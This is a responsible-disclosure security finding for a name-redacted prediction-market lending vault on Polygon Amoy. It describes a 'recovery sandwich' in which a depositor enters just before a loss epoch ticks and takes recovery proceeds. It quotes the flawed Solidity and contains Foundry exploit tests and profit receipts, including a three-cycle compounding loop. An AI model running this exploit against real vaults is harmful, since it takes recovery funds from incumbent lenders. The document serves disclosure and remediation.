# Based on deployed contracts

Project: PM-01 — name-redacted prediction-market lending protocol
Category: Prediction-market collateral lending, leveraged outcome positions and asynchronous lending vault
Severity: High — final source assessment; capital and modeled-settlement assumptions apply
Engagement: Independent hunting + responsible disclosure
Chain: Polygon Amoy testnet, chain ID 80002; source/fork snapshot block 51,383,934 (28 October 2026)
Tech stack: Solidity 0.8.26 / EVM, OpenZeppelin, ERC20, ERC1155, ERC4626 and ERC7540-style asynchronous redemption; Foundry / local Anvil fork tooling
Evidence: Historical local-fork test source and reported results; synthetic setup described below
Remediation: No confirmed remediation is established.
Contribution: Independent security research; program acceptance is not asserted.
Proof availability: Excerpts and source references; the original harness is not distributed.

# Pre-loss deposits capture recovery allocations and recycle capital

## Description

Recovery entitlement is determined from holdings just before a loss-epoch counter increments. An entrant can deposit immediately before a known liquidation/expiry and join the snapshot despite funding none of the loan's earlier exposure. It bears its share of the newly booked loss, but under the demonstrated surplus-rich settlement its recovery allocation exceeds that loss. It can exit with a net gain while diluting incumbent recovery.

The checkpoint key is a loss-epoch counter, not a block number. Same-block ordering is one execution scenario, not the sole prerequisite. A second proof enters before three known expiry moments. The behavior is established in the cited source snapshot; equivalence with an earlier audited revision is not established.

The deployment association is with the recorded Polygon Amoy testnet snapshot. Provider-runtime comparison does not establish independent recompilation, equivalence to an earlier audit revision, or a mainnet incident.

### Mechanism step by step

#### Step 1 — Checkpoint a fresh depositor at the pre-loss epoch

Source: `src/LatUSD.sol:509-527`

```solidity
    function _update(address from, address to, uint256 value) internal override {
        super._update(from, to, value);
        uint48 epoch = _currentEpoch();
        _checkpointEconomic(from, epoch);
        _checkpointEconomic(to, epoch);
        if (from == address(0) || to == address(0) || from == address(this) || to == address(this)) {
            _checkpointSupply(epoch);
        }
    }

    function _currentEpoch() internal view returns (uint48) {
        return SafeCast.toUint48(ledger.lossEpoch());
    }

    function _checkpointEconomic(address account, uint48 epoch) internal {
        if (account == address(0) || account == address(this)) return;
        uint256 shares = balanceOf(account) + _pendingShares[account];
        // slither-disable-next-line unused-return
        _economicCheckpoints[account].push(epoch, SafeCast.toUint208(shares));
```

Deposit/share movement reads the current lossEpoch and records the account. Pending shares are also counted. A capitalized entrant arriving before the next settlement counter tick therefore becomes eligible.

#### Step 2 — Increment the epoch on settlement

Source: `src/Ledger.sol:1062-1066`

```solidity
        realizedLosses += loss;
        if (loss != 0) poolLoss[loanId] = loss;
        // Every liquidation and expiry can receive disposal proceeds, covered or not: tick the
        // clock latUSD keys historical holdings by (vault-design §4).
        lossEpochOf[loanId] = ++lossEpoch;
```

Liquidation or expiry links the loan to a new loss epoch. The entrant does experience the atomic NAV drop; describing it as bearing no booked loss would be incorrect.

#### Step 3 — Read holdings from just before the increment

Source: `src/LatUSD.sol:480-501`

```solidity
    function recoveryClaimable(uint256 id, address controller) public view returns (uint256 assets) {
        uint256 epoch = ledger.lossEpochOf(id);
        if (epoch == 0) return 0;
        uint256 supply = economicSupplyAt(epoch);
        if (supply == 0) return 0;

        uint256 entitled = MathLib.mulDivDown(economicBalanceAt(controller, epoch), recoveryCredited[id], supply);
        uint256 claimed = _recoveryClaimed[id][controller];
        assets = entitled > claimed ? entitled - claimed : 0;
    }

    /// @inheritdoc ILatUSD
    /// @dev Holdings as they stood when `epoch` was booked: the latest checkpoint keyed below it.
    function economicBalanceAt(address account, uint256 epoch) public view returns (uint256 shares) {
        if (epoch == 0 || account == address(this)) return 0;
        shares = _economicCheckpoints[account].upperLookupRecent(SafeCast.toUint48(epoch - 1));
    }

    /// @inheritdoc ILatUSD
    function economicSupplyAt(uint256 epoch) public view returns (uint256 shares) {
        if (epoch == 0) return 0;
        shares = _supplyCheckpoints.upperLookupRecent(SafeCast.toUint48(epoch - 1));
```

Recovery pro-rates cumulative credit using checkpoints at epoch-1. This includes the fresh pre-loss entrant and survives its later redemption; post-loss deposit exclusion does not prevent this case.

#### Step 4 — Keep recovery outside ordinary NAV

Source: `src/LatUSD.sol:442-452`

```solidity
    function creditRecovery(uint256 id, uint256 amount) external nonReentrant {
        if (!ledger.authorized(msg.sender)) revert Errors.Unauthorized(msg.sender);
        uint256 epoch = ledger.lossEpochOf(id);
        if (epoch == 0) revert Errors.NoLossEpoch(id);

        emit Events.RecoveryCredited(id, amount, epoch);
        // Always reserved, never NAV: pricing a recovery into the next entry is exactly the
        // capture ADR-7 removes (Zenith #9, #16). If nobody held at the loss, the credit is
        // simply claimable by no one.
        recoveryCredited[id] += amount;
        recoveryReserved += amount;
```

Authorized remittance reserves recovery separately. The attacker redeems at post-loss NAV and claims its frozen recovery allocation. Profit requires enough actual recovery/surplus; the harness supplies modeled sale proceeds through an impersonated remitter.

### Impact and proof limits

Single-event receipt: 100,000 deposit; 5,369.906977 recovery; 97,030.091213 redemption; **2,399.998190 net gain**. Incumbent recovery is 5,369.915075. Net includes the attacker's share of booked loss; the full recovery allocation is not profit. No clock advances between deposit and trigger in this single-window harness.

Three-expiry receipt: 100,000 bankroll becomes 107,390.890586; net **7,390.890586** and aggregate recovery 16,610.727215. It demonstrates three controlled cycles, not indefinite live repetition. Each cycle deposits 30 seconds before epochEnd and warps 60 seconds before the expiry call (`poc/src/CompoundingSandwich.t.sol:73-86`), so its literal exposure is not zero-duration. Remittance is modeled immediately. Real repayment/roll behavior, ordering, price, disposal timing, gas and capital availability can change the result. Capturing about half required capital near the existing book size; event frequency is unproven.

### Remediation direction

Align recovery entitlement with the exposure producing it, including already-outstanding credit at entry. Evaluate per-loan/epoch accounting and borrower-surplus policy; a minimum holding time alone can simply shift timing. Test pre/post-loss deposits, queued/transferred shares, partial recovery, Buffer funding and true net redemption payout.

No confirmed fix is established by the available evidence.

## Proof of concept

Recorded `test_recoverySandwich`, `poc/src/RecoverySandwich.t.sol:57-117`, and `test_compoundingSandwichAcrossEpochs`, `poc/src/CompoundingSandwich.t.sol:67-116`. Historical receipts are in `two-findings-writeup.md:95-109`; the original report records the compounding pass at `findings-after-source-2026-10-28.md:77-82`. Setup impersonates timelock for signers, mints lender/attacker funds and collateral, and impersonates the remitter for 12,000 proceeds per event. The initial sandwich uses a controlled stale mark; natural expiry triggers do not need liquidation marks, but loan origination still needs valid quotes/marks.

## Relevant test excerpts

Controlled setup and bankroll:

Source: `poc/src/CompoundingSandwich.t.sol:32-45`

```solidity
        markSigner = vm.addr(markKey);
        quoteSigner = vm.addr(quoteKey);
        vm.startPrank(TL);
        pool.setMarkSigner(markSigner);
        liq.setMarkSigner(markSigner);
        oracle.setSigner(quoteSigner);
        vm.stopPrank();
        pusd.mint(lender, 100_000e6);
        vm.startPrank(lender);
        pusd.approve(VAULT, type(uint256).max);
        vault.deposit(100_000e6, lender);
        vm.stopPrank();
        pusd.mint(attacker, 100_000e6); // attacker's whole bankroll
    }
```

Single-event entry and trigger:

Source: `poc/src/RecoverySandwich.t.sol:71-83`

```solidity
        vm.warp(t0 + 240);
        // The sandwich: attacker sees the pending trigger (mempool or constructs
        // it with a stale mark), deposits first, same window, zero exposure duration.
        pusd.mint(attacker, 100_000e6);
        vm.startPrank(attacker);
        pusd.approve(VAULT, type(uint256).max);
        vault.deposit(100_000e6, attacker);
        vm.stopPrank();

        MarkAttestation memory mLow = MarkAttestation(TOKEN_ID, MARK_032, t0);
        bytes memory sl = _sign(liqDom, keccak256(abi.encode(MARK_TYPEHASH, mLow.tokenId, mLow.mark, mLow.timestamp)), markKey);
        vm.prank(attacker);
        liq.triggerLiquidation(loanId, mLow, sl);
```

Actual recovery/redemption and net assertions:

Source: `poc/src/RecoverySandwich.t.sol:97-112`

```solidity
        uint256[] memory ids = new uint256[](1);
        ids[0] = loanId;
        uint256 attackerRecovery = vault.recoveryClaimable(loanId, attacker);
        uint256 lenderRecovery = vault.recoveryClaimable(loanId, lender);
        vm.prank(attacker);
        uint256 recoveryPaid = vault.claimRecovery(ids, attacker, attacker);

        vault.crank(type(uint256).max);
        uint256 claimable = vault.claimableAssets(attacker);
        vm.prank(attacker);
        vault.withdraw(claimable, attacker, attacker);

        uint256 attackerTotal = recoveryPaid + claimable;
        int256 attackerNet = int256(attackerTotal) - int256(100_000e6);
        assertTrue(attackerRecovery > 0, "zero-duration depositor captured recovery");
        assertTrue(attackerNet > 0, "sandwich is net positive");
```

Repeated-expiry timing and privileged modeled proceeds:

Source: `poc/src/CompoundingSandwich.t.sol:73-105`

```solidity
        for (uint256 cycle = 1; cycle <= 3; cycle++) {
            uint256 loanId = _borrowFresh(cycle, t);
            // Deposit right before the known expiry moment: zero market exposure.
            t = t + 1 days - 30;
            vm.warp(t);
            uint256 cash = pusd.balanceOf(attacker);
            vm.startPrank(attacker);
            pusd.approve(VAULT, type(uint256).max);
            vault.deposit(cash, attacker);
            vm.stopPrank();

            // The clock does the rest. Permissionless, deterministic, public.
            vm.warp(t + 60);
            liq.claimExpired(loanId);

            // Exit immediately: queue, then recover the rest after remit.
            uint256 sh = IERC20M(VAULT).balanceOf(attacker);
            vm.prank(attacker);
            vault.requestRedeem(sh, attacker, attacker);

            pusd.mint(LIQ_WALLET, 12_000e6);
            vm.startPrank(LIQ_WALLET);
            pusd.approve(LIQUIDATOR, 12_000e6);
            liq.remitProceeds(loanId, 12_000e6);
            vm.stopPrank();

            ids[0] = loanId;
            vm.prank(attacker);
            totalRecoveryPaid += vault.claimRecovery(ids, attacker, attacker);
            vault.crank(type(uint256).max);
            uint256 claimable = vault.claimableAssets(attacker);
            vm.prank(attacker);
            vault.withdraw(claimable, attacker, attacker);
```

Loop assertions:

Source: `poc/src/CompoundingSandwich.t.sol:109-116`

```solidity
        uint256 finalCash = pusd.balanceOf(attacker);
        assertTrue(finalCash > bankroll, "capital recycled and grew across epochs");
        assertTrue(totalRecoveryPaid > 3 * 5_000e6, "attacker captured >half of every epoch's recovery");
        // Rate: net over bankroll over 3 days of exposure.
        emit Receipt(string(abi.encodePacked(
            "N4_LOOP_RESULT={cycles:3, bankroll:", _u2s(bankroll), ", finalCash:", _u2s(finalCash),
            ", cumulativeNet:", _u2s(finalCash - bankroll), ", recoveryCaptured:", _u2s(totalRecoveryPaid),
            ", perCycleNet:", _u2s((finalCash - bankroll) / 3), ", exposureType:expiryOnlyNoMarkNoPriceRisk}")));
```

Recorded receipts:

Source: `two-findings-writeup.md:98-100`

```text
SANDWICH_RESULT={attackerDeposited:100000000000, attackerRecoveryShare:5369906977,
lenderRecoveryShare:5369915075, attackerRedeemed:97030091213, attackerNet:2399998190,
exposureSeconds:0, victimWasHealthyAtCurrentMark:true, fixedByZenithH2:false}
```

Source: `two-findings-writeup.md:106-108`

```text
N4_LOOP_RESULT={cycles:3, bankroll:100000000000, finalCash:107390890586,
cumulativeNet:7390890586, recoveryCaptured:16610727215, perCycleNet:2463630195,
exposureType:expiryOnlyNoMarkNoPriceRisk}
```
